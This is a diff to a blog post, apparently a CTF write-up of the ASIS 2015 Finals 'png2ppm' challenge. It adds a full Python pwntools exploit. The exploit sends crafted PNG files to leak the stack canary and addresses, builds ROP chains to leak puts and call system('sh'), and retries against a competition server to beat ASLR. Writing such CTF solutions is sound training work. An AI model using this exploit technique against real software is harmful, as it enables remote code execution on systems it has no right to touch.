@@ -1,6 +1,6 @@
 ---
 layout: post
-title: ASIS 2015 Finals: png2ppm
+title: "ASIS 2015 Finals: png2ppm"
 modified: 2015-10-14
 tags: asis, asis2015finals, pwn
 ---
@@ -33,4 +33,89 @@ So in the next ROP chain I could call the system with "sh". For this I had to ca
 
 Because of the partial overwrite, I also overwrote 4 bits from the ASLR random part, so for the real server I had to run the exploit multiple times to hit the correct address with a 1/16 change (locally I debugged it with disabled ASLR).
 
-Finally I could print the flag out: ASIS{487e532d3aae05f1717f46104ba4ebf6}
+Finally I could print the flag out:
+{% highlight text %}
+ASIS{487e532d3aae05f1717f46104ba4ebf6}
+{% endhighlight %}
+
+### Exploit code
+
+{% highlight python %}
+import sys
+import binascii
+import struct
+import zlib
+from pwn import *
+from time import sleep
+
+for iTry in xrange(64):
+    print "Try #%d / 64" % (iTry + 1)
+    try:
+        p = remote('185.106.120.22', 1337)
+
+        time.sleep(0.5)
+
+        def getChunk(data):
+            return struct.pack('>I', len(data) - 4) + data + struct.pack('>i', binascii.crc32(data))
+
+        def convertPng(width, height, plain):
+            pngHdr = "\x89PNG\x0d\x0a\x1a\x0a";
+            iHdr = getChunk("IHDR" + struct.pack('>II', width, height) + "\x08\x06\x00\x00\x00")
+            iDat = getChunk("IDAT" + zlib.compress(plain))
+            iEnd = getChunk("IEND")
+            pngData = pngHdr + iHdr + iDat + iEnd
+            p.send(str(len(pngData)) + '\n' + pngData)
+
+        #system = "\x2e\x5d"
+        mainPart = "\x79\x5a"
+
+        convertPng(6, 1, ("\x02" + "\x00" * 24) * 6 + "\x00"*9 + mainPart)
+
+        p.recvuntil('\n255\n')
+        leakLine1 = p.recvline().strip()
+        p.recvuntil('\n255\n')
+        leakLine2 = p.recvline().strip()
+        print "Leak lines = %r, %r" % (leakLine1, leakLine2)
+
+        leakStr1 = ''.join([chr(int(x)) for x in leakLine1.split(' ')])
+        leakStr2 = ''.join([chr(int(x)) for x in leakLine2.split(' ')])
+        cookieLeak = u64(leakStr1[0:3]+leakStr2[0]+leakStr1[3:6]+leakStr2[1])
+        stackBase = u64(leakStr1[6:9]+leakStr2[2]+leakStr1[9:12]+leakStr2[3]) - 0x1fc60 - 0x480
+        prgBase = u64(leakStr1[12:15]+leakStr2[4]+leakStr1[15:18]+leakStr2[5]) - 0x184e
+        print "Leaks: cookie = 0x%016x, stack = 0x%016x, prg = 0x%016x" % (cookieLeak, stackBase, prgBase)
+
+        puts = prgBase + 0xa20
+        putsGot = prgBase + 0x202f48
+        popRdi = prgBase + 0x1b53
+        main = prgBase + (((ord(mainPart[1]) - 0x40) << 8) + ord(mainPart[0]))
+        rbx = "BBBBBBBB"
+        rbp = "CCCCCCCC"
+        ret = "DDDDDDDD"
+
+        convertPng(64, 1, "\x00"*(1+64*4)+"\x00" + "X"*80 + p64(cookieLeak) + "XXXXXXXX"+rbx+rbp+p64(popRdi)+p64(putsGot)+p64(puts)+p64(main))
+        p.recvuntil('\n255\n')
+        p.recvuntil('\n255\n')
+        p.recvline()
+        putsLeak = u64(p.recvline()[:-1]+'\x00'*2)
+        print "puts leak = 0x%016x" % putsLeak
+
+        putsLocal = 0x7ffff786be30
+        systemLocal = 0x7ffff7842640
+        remoteSystem = putsLeak - putsLocal + systemLocal
+
+        stackBaseLocal = 0x7ffffffde000
+        binShLocal = 0x7fffffffe0e8
+        binShRemote = stackBase - stackBaseLocal + binShLocal
+
+        convertPng(64, 1, "\x00"*(1+64*4)+"\x00" + "X"*80 + p64(cookieLeak) + "XXXXXXXX"+rbx+rbp+p64(popRdi)+p64(binShRemote)+p64(remoteSystem)+"sh\x00")
+
+        p.send('cat flag\n')
+        p.interactive()
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+        print "Fail!"
+{% endhighlight %}
